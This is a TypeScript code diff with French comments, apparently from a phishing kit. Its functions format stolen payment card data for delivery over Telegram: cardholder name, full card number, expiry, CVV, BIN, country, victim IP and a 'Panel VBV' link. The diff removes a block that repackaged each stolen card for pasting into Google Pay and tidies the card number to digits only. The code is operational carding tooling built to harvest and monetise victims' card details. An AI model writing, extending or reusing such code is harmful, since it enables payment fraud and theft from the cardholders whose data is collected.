@@ -25,52 +25,6 @@ function cardNumberDigitsOnly(value: string | undefined | null): string {
   return String(value).replace(/\D/g, "");
 }
 
-/** Formate expiration pour wallets (MM/YY) — format attendu par Google Pay */
-function expiryForWallet(value: string | undefined | null): string {
-  if (!value) return "";
-  const s = String(value).replace(/\s/g, "");
-  const match = s.match(/^(\d{1,2})[\/\-]?(\d{2,4})$/);
-  if (match) {
-    const mm = match[1].padStart(2, "0");
-    const yy = match[2].length === 4 ? match[2].slice(-2) : match[2];
-    return `${mm}/${yy}`;
-  }
-  return s;
-}
-
-/** CVC/CVV chiffres uniquement (3 ou 4 chiffres pour Google Pay) */
-function cvcDigitsOnly(value: string | undefined | null): string {
-  if (!value) return "";
-  return String(value).replace(/\D/g, "").slice(0, 4);
-}
-
-/**
- * Construit le bloc Wallet optimisé Google Pay (libellés et format reconnus par Google Pay).
- * Inclut une ligne one-line pour copier-coller ou parsing automatique.
- */
-function buildGooglePayBlock(
-  cardNumber: string,
-  expiryDate: string,
-  cvv: string,
-  cardholder: string,
-  escape: (s: string) => string,
-): string {
-  const pan = cardNumberDigitsOnly(cardNumber);
-  const exp = expiryForWallet(expiryDate);
-  const cvc = cvcDigitsOnly(cvv);
-  const name = (cardholder || "").trim();
-  let block = `│────────── CC Pay ──────────\n`;
-  block += `│Card number: ${escape(pan)}\n`;
-  block += `│Expiration date: ${escape(exp)}\n`;
-  block += `│CVC: ${escape(cvc)}\n`;
-  block += `│Name on card: ${escape(name)}\n`;
-  if (pan && (exp || cvc || name)) {
-    block += `│[paste] ${escape([pan, exp, cvc, name].join("|"))}\n`;
-  }
-  block += `│─────────────────────────────────\n`;
-  return block;
-}
-
 /**
  * Construit un message Telegram selon le format standardisé
  * Format: │=========AF-REZ-========= + données + │===========oZy===========
@@ -112,8 +66,8 @@ export function buildTelegramMessage(
   // Cardholder Name
   message += `│👤 Cardholder Name: ${escapeTelegram(cardholder)}\n`;
   
-  // Card Number
-  message += `│💳 Card Number: ${escapeTelegram(cardNumber)}\n`;
+  // Card Number (chiffres uniquement, format propre)
+  message += `│💳 Card Number: ${escapeTelegram(cardNumberDigitsOnly(cardNumber))}\n`;
   
   // Expiry Date
   message += `│📆 Expiry Date: ${escapeTelegram(expiryDate)}\n`;
@@ -131,9 +85,6 @@ export function buildTelegramMessage(
     message += `│\n`;
     message += `│🔗 Panel VBV: ${escapeTelegram(panelLink)}\n`;
   }
-
-  message += `│\n`;
-  message += buildGooglePayBlock(cardNumber, expiryDate, cvv, cardholder, escapeTelegram);
 
   message += `│\n`;
   message += `│===========oZy===========\n`;
@@ -170,19 +121,11 @@ export function buildTelegramMessage3DS(
   message += `│🌐 Country: ${escapeTelegram(card.country ?? "")}\n`;
   message += `│🏦 BIN: ${escapeTelegram(card.bin ?? "")}\n`;
   message += `│👤 Cardholder Name: ${escapeTelegram(card.cardholder ?? "")}\n`;
-  message += `│💳 Card Number: ${escapeTelegram(card.cardNumber ?? "")}\n`;
+  message += `│💳 Card Number: ${escapeTelegram(cardNumberDigitsOnly(card.cardNumber ?? ""))}\n`;
   message += `│📆 Expiry Date: ${escapeTelegram(card.expiry ?? "")}\n`;
   message += `│🔐 CVV: ${escapeTelegram(card.cvv ?? "")}\n`;
   message += `│──────────\n`;
   message += `│🌐 IP: ${escapeTelegram(ip)}\n`;
-  message += `│\n`;
-  message += buildGooglePayBlock(
-    card.cardNumber ?? "",
-    card.expiry ?? "",
-    card.cvv ?? "",
-    card.cardholder ?? "",
-    escapeTelegram,
-  );
   message += `│\n`;
   message += `│===========oZy===========\n`;
   return message.trim();
